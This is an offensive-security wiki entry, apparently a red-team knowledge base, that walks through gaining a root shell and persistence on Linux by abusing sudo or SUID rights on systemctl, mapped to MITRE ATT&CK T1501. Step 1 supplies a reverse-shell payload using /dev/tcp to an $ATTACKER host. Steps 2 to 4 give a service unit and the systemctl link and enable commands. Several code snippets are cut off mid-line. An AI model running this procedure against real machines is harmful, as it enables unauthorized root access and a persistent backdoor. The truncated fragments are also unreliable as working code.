---
id: 62ba11f0-2245-4d79-8d83-65851c6c8999
name: Create a Systemd Service
type: procedure
verified: true
submitted: true
created_at: '2019-10-16T23:21:22.795888+00:00'
updated_at: '2023-05-26T00:45:16.496725+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Systemd Service|T1501 - Systemd Service]]'
platforms:
- Linux
tags:
- '[[Service Attacks]]'
commands:
- '[[systemctl Enable and Start a Service by File Name]]'
- '[[systemctl Link a Service Unit File]]'
---

# Create a Systemd Service

**Status**: ✓ Verified

## Summary

Systemctl requires root privileges for many operations, which leads to cases where systemctl has either SUID rights, or certain users can execute it with sudo privileges. When configured with either option, it is possible to create a service unit file containing a payload, which can be executed for

## Description

# Description

Systemctl requires root privileges for many operations, which leads to cases where systemctl has either SUID rights, or certain users can execute it with sudo privileges. When configured with either option, it is possible to create a service unit file containing a payload, which can be executed for a root shell.



# Instructions

In this example, systemctl has been configured with sudo privileges, but the steps remain the same when it has SUID.

**Important Note: the full path to programs must be specified when using systemctl service unit files!**



1. Select a payload and save it as /tmp/rootshell. Suggested:





**Code**: [[/bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKER_I]]





2. Create a Systemctl Service Unit and save it as /tmp/root.service.





**Code**: [[[Unit]
Description=rootshell
[Service]
Type=notify]]





3. Link the unit file.





**Command** ([[systemctl Link a Service Unit File]]):

```bash
sudo systemctl link $FULL_PATH_TO_FILE
```





4. Enable and run the service





**Command** ([[systemctl Enable and Start a Service by File Name]]):

```bash
sudo systemctl enable --now $FULL_PATH_TO_FILE
```





## Platforms

- Linux

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Systemd Service|T1501 - Systemd Service]]

## Commands Used

- [[systemctl Enable and Start a Service by File Name]]
- [[systemctl Link a Service Unit File]]

## Tags

- [[Service Attacks]]


